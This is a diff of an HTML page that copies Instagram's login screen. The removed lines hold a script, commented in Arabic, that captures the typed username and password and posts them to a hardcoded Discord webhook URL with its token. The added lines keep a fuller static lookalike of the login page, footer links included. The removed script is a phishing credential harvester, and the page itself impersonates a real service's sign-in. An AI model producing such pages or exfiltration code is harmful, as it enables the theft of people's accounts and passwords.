@@ -1,90 +1,74 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Instagram Login Page</title>
-  <link rel="stylesheet" href="styles.css">
+	<meta charset="UTF-8">
+	<title>Instagram Login Page</title>
+	<link rel="stylesheet" href="styles.css">
 </head>
 <body>
 
 <div class="wrapper">
-  <div class="header">
-    <div class="top">
-      <div class="logo">
-        <img src="instagram.png" alt="instagram" style="width: 175px;">
-      </div>
-      <div class="form">
-        <div class="input_field">
-          <input type="text" id="username" placeholder="Phone number, username, or email" class="input">
-        </div>
-        <div class="input_field">
-          <input type="password" id="password" placeholder="Password" class="input">
-        </div>
-        <div class="btn">
-          <button id="loginButton">Log In</button>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="footer">
-    <div class="links">
-      <ul>
-        <li><a href="#">ABOUT US</a></li>
-        <li><a href="#">SUPPORT</a></li>
-        <li><a href="#">PRESS</a></li>
-      </ul>
-    </div>
-    <div class="copyright">
-      © 2019 INSTAGRAM
-    </div>
-  </div>
+	<div class="header">
+		<div class="top">
+			<div class="logo">
+				<img src="instagram.png" alt="instagram" style="width: 175px;">
+			</div>
+			<div class="form">
+				<div class="input_field">
+					<input type="text" placeholder="Phone number, username, or email" class="input">
+				</div>
+				<div class="input_field">
+					<input type="password" placeholder="Password" class="input">
+				</div>
+				<div class="btn"><a href="#">Log In</a></div>
+			</div>
+			<div class="or">
+				<div class="line"></div>
+				<p>OR</p>
+				<div class="line"></div>
+			</div>
+			<div class="dif">
+				<div class="fb">
+					<img src="facebook.png" alt="facebook">
+					<p>Log in with Facebook</p>
+				</div>
+				<div class="forgot">
+					<a href="#">Forgot password?</a>
+				</div>
+			</div>
+		</div>
+		<div class="signup">
+			<p>Don't have an account? <a href="#">Sign up</a></p>
+		</div>
+		<div class="apps">
+			<p>Get the app.</p>
+			<div class="icons">
+				<a href="#"><img src="appstore.png" alt="appstore"></a>
+				<a href="#"><img src="googleplay.png" alt="googleplay"></a>
+			</div>
+		</div>
+	</div>
+	<div class="footer">
+		<div class="links">
+			<ul>
+				<li><a href="#">ABOUT US</a></li>
+				<li><a href="#">SUPPORT</a></li>
+				<li><a href="#">PRESS</a></li>
+				<li><a href="#">API</a></li>
+				<li><a href="#">JOBS</a></li>
+				<li><a href="#">PRIVACY</a></li>
+				<li><a href="#">TERMS</a></li>
+				<li><a href="#">DIRECTORY</a></li>
+				<li><a href="#">PROFILES</a></li>
+				<li><a href="#">HASHTAGS</a></li>
+				<li><a href="#">LANGUAGE</a></li>
+			</ul>
+		</div>
+		<div class="copyright">
+			© 2019 INSTAGRAM
+		</div>
+	</div>
 </div>
-
-<script>
-document.getElementById("loginButton").addEventListener("click", function(event) {
-    event.preventDefault(); // منع الإرسال الافتراضي للنموذج
-
-    // الحصول على القيم من المدخلات
-    const username = document.getElementById("username").value;
-    const password = document.getElementById("password").value;
-
-    console.log("Username: ", username);  // هذا يساعدك على رؤية القيم في الـ Console
-    console.log("Password: ", password);  // تأكد من أن القيم يتم استخراجها بشكل صحيح
-
-    // التأكد من أن الحقول ليست فارغة
-    if (username && password) {
-        // البيانات التي سيتم إرسالها إلى ديسكورد
-        const data = {
-            content: New login attempt:\n**Username:** ${username}\n**Password:** ${password}
-        };
-
-        // رابط Webhook الخاص بك (استبدله بالرابط الفعلي)
-        const webhookUrl = "https://discord.com/api/webhooks/1345817740761628702/-MdL4BrEenT9JtuMpg3LvU4bCHXUDcExH8N-E8CgNtVuEiIzEMCDEqFvZVdst7mszQQK";  // ضع الرابط الفعلي هنا
-
-        // إرسال البيانات عبر Webhook باستخدام fetch (AJAX)
-        fetch(webhookUrl, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(data) // تأكد من تحويل البيانات إلى JSON
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log("Data sent to Discord successfully.");
-            } else {
-                console.log("Error sending data to Discord.");
-            }
-        })
-        .catch(error => {
-            console.error("Error:", error);
-        });
-    } else {
-        alert("Please fill in both fields.");
-    }
-});
-</script>
 
 </body>
 </html>
